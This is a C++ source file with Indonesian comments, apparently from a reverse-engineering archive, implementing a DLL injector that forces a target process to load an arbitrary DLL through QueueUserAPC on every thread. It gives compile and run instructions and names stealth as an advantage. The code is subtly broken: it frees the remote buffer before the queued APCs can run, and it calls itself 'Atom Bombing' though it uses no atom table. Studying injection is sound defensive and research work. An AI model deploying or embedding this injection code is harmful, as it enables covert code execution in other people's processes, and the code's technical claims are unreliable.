/*
    WIP!!!!

    C++ Injector
    Archive of Reversing.ID

    Inject sebuah DLL ke sebuah proses.
    Menggunakan API QueueUserAPC

Compile:
    (clang)
    $ clang++ injector.cpp -o injector

    (msvc)
    $ cl injector.cpp

Run:
    $ injector <PID> <dll path>
*/

#include <windows.h>
#include <tlHelp32.h>
#include <stdio.h>

/*
    Teknik ini disebut juga dengan Atom Bombing, yaitu mengeksploitasi Windows Atom Table
    dan Asynchronous Procedure Call (APC).

    Asynchronous Procedure Call (APC) adalah mekanisme agar thread dapat melakukan 
    task secara asinkron. Setiap thread memiliki queue APC yang dijalankan secara 
    FIFO (First-In First-Out) ketika thread memasuki "alertable state".

    Thread memasuki "alertable state" ketika memanggil fungsi seperti:
    - SleepEx
    - SignalObjectAndWait
    - WaitForSingleObjectEx
    - WaitForMultipleObjectsEx
    - MsgWaitForMultipleObjectsEx
    - NtTestAlert
    - dll

    QueueUserAPC() menambahkan objek user-mode Asynchronous Procedure Call (APC).
    ke APC queue dari thread tertentu.

    Injection ini menggunakan teknik Atomic Bombing (Tal Liberman).

Pros:
    + tidak perlu menciptakan thread baru
    + lebih stealth

Cons:
    - tidak selalu memungkinkan untuk semua thread (harus memiliki flag tertentu).
    - tidak bisa memaksa thread untuk langsung menjalankan kode (scheduling)


Ide:
    - buat event untuk semua thread di process.
    - minta setiap thread untuk set event
    - tunggu hingga salah satu event terpicu (trigger)
        - setiap thread yang memicu event adalah alerted thread.
*/

int inject (const int pid, const char* dll_path);

int main (int argc, char* argv[])
{
    printf ("DLL Injector written in C++\n\n");

    if (argc != 3) 
    {
        fprintf (stderr, "[!] Should have 2 arguments!\n");
        fprintf (stderr, "Usage: %s <PID> <dll path>", argv[0]);
        return 1;
    }

    return inject (atoi (argv[1]), argv[2]);
}

int inject (const int pid, const char* dll_path)
{
    HMODULE kernel_handle_addr;
    HANDLE  remote;
    HANDLE  snapshot;
    HANDLE  thread;
    HANDLE  result = NULL;
    THREADENTRY32   entry;
    void *  alloc_addr;
    void *  load_lib;
    int     dll_path_len = strlen(dll_path) + 1;
    int     write_result;

    int     error_code;
    int     retcode = 0;
    char    error_message_buffer[256];

    SIZE_T  num_written;

    printf ("[+] Starting DLL Injector\n");

    /*
        [1] buka akses ke remote process

        Semua operasi yang akan dilakukan berikutnya terjadi di process target.
        Untuk itu, process target harus dapat dimanipulasi dengan terlebih dahulu mendapatkan
        akses ke process tersebut.

        API: HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
    */
    
    printf ("[+] Get process handle for PID: %d\n", pid);
    remote = OpenProcess (PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (remote == NULL)
        retcode = 1;
    else 
    {
        printf ("    [=] Handle obtained: %p\n", remote);

    /* 
        [2] alokasikan ruang di process

        Pada case ini, ruang memory dialokasikan untuk menyimpan path dan nama file DLL.
        Process kemudian dipaksa melakukan loading terhadap DLL dengan memanfaatkan API.
    
        API: LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    */ 
        printf ("[+] Allocating space for DLL path\n");

        alloc_addr = VirtualAllocEx (remote, NULL, dll_path_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        if (alloc_addr == NULL)
            retcode = 2;
        else 
        {
            printf("    [=] Address allocated: %p\n", alloc_addr);

    /*
        [3] tulis path DLL

        path dan nama file DLL harus dapat dijangkau oleh aplikasi, baik secara absolute maupun
        relative.

        API: BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
    */
            printf("[+] Writing DLL path to current process space\n");

            write_result = WriteProcessMemory(remote, alloc_addr, dll_path, dll_path_len, &num_written);
            if (!write_result)
                retcode = 3;
            else 
            {
                printf("    [=] Writing success!\n");

    /*
        [4] Resolve address kernel32.dll & LoadLibraryA

        API LoadLibraryA dibutuhkan untuk memuat DLL.
        Fungsi ini didefinisikan di dalam kernel32.dll dan sebagian besar process memuat
        library tersebut (default).

        API: HMODULE GetModuleHandleA(LPCSTR lpModuleName);
        API: FARPROC GetProcAddress(HMODULE hModule,LPCSTR lpProcName);
    */
                kernel_handle_addr  = GetModuleHandleA ("kernel32.dll");
                load_lib            = (LPVOID) GetProcAddress (kernel_handle_addr, "LoadLibraryA");

                printf ("[+] Resolving call specific functions and libraries\n");
                printf ("    [=] Resolved kernel32 library at %p\n", kernel_handle_addr);
                printf ("        -> Resolved LoadLibraryA function at %p\n", load_lib);

    /*
        [5] Sisipkan APC ke semua queue di alertable thread.

        Dapatkan snapshot thread saat ini dan iterasi seluruh thread.

        API: HANDLE CreateToolhelp32Snapshot (DWORD dwFlags, DWORD th32ProcessID);
        API: BOOL Thread32First (HANDLE hSnapshot, LPTHREADENTRY32 lpte);
        API: BOOL Thread32Next (HANDLE hSnapshot, LPTHREADENTRY32 lpte);
    */
                printf ("[+] Hijacking thread for PID: %d\n", pid);
                printf ("    [=] Finding suitable thread\n");

                entry.dwSize = sizeof(THREADENTRY32);
                snapshot = CreateToolhelp32Snapshot (TH32CS_SNAPTHREAD, pid);
                if (snapshot == INVALID_HANDLE_VALUE)
                    retcode = 4;
                else if (Thread32First (snapshot, &entry))
                {
                    do 
                    {
                        if (entry.th32OwnerProcessID != pid)
                            continue;
                        
                        printf("        [-] Thread ID: %ld\n", entry.th32ThreadID);
                        
                        // buka akses ke thread
                        thread = OpenThread (THREAD_ALL_ACCESS, FALSE, entry.th32ThreadID);
                        if (thread == NULL)
                        {
                            printf("        [x] cannot open thread\n");
                            continue;
                        }

                        // suspend-inject-resume
                        SuspendThread (thread);
                        QueueUserAPC((PAPCFUNC) load_lib, thread, (ULONG_PTR)alloc_addr);
                        ResumeThread (thread);

                        CloseHandle (thread);
                    } while (Thread32Next (snapshot, &entry));
                }
            }
            VirtualFreeEx (remote, alloc_addr, 0, MEM_RELEASE);
        }
        CloseHandle (remote);
    }

    if (retcode)
    {
        error_code = GetLastError ();
        FormatMessageA (FORMAT_MESSAGE_FROM_SYSTEM, NULL, error_code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message_buffer, 256, NULL);
        fprintf (stderr, "[!] Error: %d %s\n", error_code, error_message_buffer);
    }
    return retcode;
}